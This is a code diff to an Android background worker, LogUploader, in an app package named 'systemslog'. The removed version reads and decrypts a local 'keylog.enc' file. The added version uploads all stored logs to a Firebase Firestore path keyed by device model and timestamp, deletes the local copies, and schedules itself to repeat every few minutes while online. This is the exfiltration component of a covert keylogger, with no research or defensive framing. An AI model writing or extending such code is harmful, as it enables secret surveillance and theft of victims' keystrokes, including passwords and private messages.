@@ -1,65 +1,59 @@
 package com.example.systemslog;
 
 import android.content.Context;
-import androidx.annotation.NonNull;
-import androidx.work.Worker;
-import androidx.work.WorkerParameters;
-
-import com.example.systemslog.utils.DeviceInfo;
+import android.util.Log;
+import androidx.work.*;
 import com.google.firebase.firestore.FirebaseFirestore;
-
-import java.io.BufferedReader;
-import java.io.FileInputStream;
-import java.io.InputStreamReader;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 
 public class LogUploader extends Worker {
-    public LogUploader(@NonNull Context context, @NonNull WorkerParameters params) {
+
+    public LogUploader(Context context, WorkerParameters params) {
         super(context, params);
     }
 
-    @NonNull
     @Override
     public Result doWork() {
-        try {
-            FileInputStream fis = getApplicationContext().openFileInput("keylog.enc");
-            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
-            String line;
-            List<String> decryptedLogs = new ArrayList<>();
+        Context context = getApplicationContext();
+        Map<Long, String> logs = FileManager.getAllLogs(context);
+        FirebaseFirestore db = FirebaseFirestore.getInstance();
 
-            while ((line = reader.readLine()) != null) {
-                try {
-                    String decrypted = EncryptionUtils.decrypt(line);
-                    decryptedLogs.add(decrypted);
-                } catch (Exception e) {
-                    e.printStackTrace(); // skip failed decryption
-                }
-            }
-            reader.close();
+        String device = android.os.Build.MODEL.replace(" ", "_");
+        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
+        SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm", Locale.getDefault());
 
-            if (!decryptedLogs.isEmpty()) {
-                FirebaseFirestore db = FirebaseFirestore.getInstance();
-                String deviceName = new DeviceInfo(getApplicationContext()).getName();
-                String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
-                String time = new SimpleDateFormat("HH-mm-ss", Locale.getDefault()).format(new Date());
+        for (Map.Entry<Long, String> entry : logs.entrySet()) {
+            String date = dateFormat.format(new Date(entry.getKey()));
+            String time = timeFormat.format(new Date(entry.getKey()));
+            String path = String.format("devices/%s/%s/%s", device, date, time);
 
-                Map<String, Object> data = new HashMap<>();
-                data.put("logs", decryptedLogs);
+            Map<String, Object> logEntry = new HashMap<>();
+            logEntry.put("log", entry.getValue());
 
-                db.collection("devices")
-                        .document(deviceName)
-                        .collection(date)
-                        .document(time)
-                        .set(data);
-
-                getApplicationContext().deleteFile("keylog.enc");
-            }
-
-            return Result.success();
-        } catch (Exception e) {
-            e.printStackTrace();
-            return Result.retry(); // Retry when internet returns
+            db.document(path)
+                    .set(logEntry)
+                    .addOnSuccessListener(aVoid -> Log.d("LogUploader", "✅ Uploaded log at " + path))
+                    .addOnFailureListener(e -> Log.e("LogUploader", "❌ Failed upload", e));
         }
+
+        FileManager.deleteAllLogs(context); // clear local logs after sending
+        return Result.success();
+    }
+
+    public static void scheduleUploader(Context context) {
+        PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(
+                LogUploader.class, 3, TimeUnit.MINUTES)
+                .setConstraints(new Constraints.Builder()
+                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                        .build())
+                .build();
+
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+                "LogUploaderWork",
+                ExistingPeriodicWorkPolicy.KEEP,
+                request
+        );
     }
 }
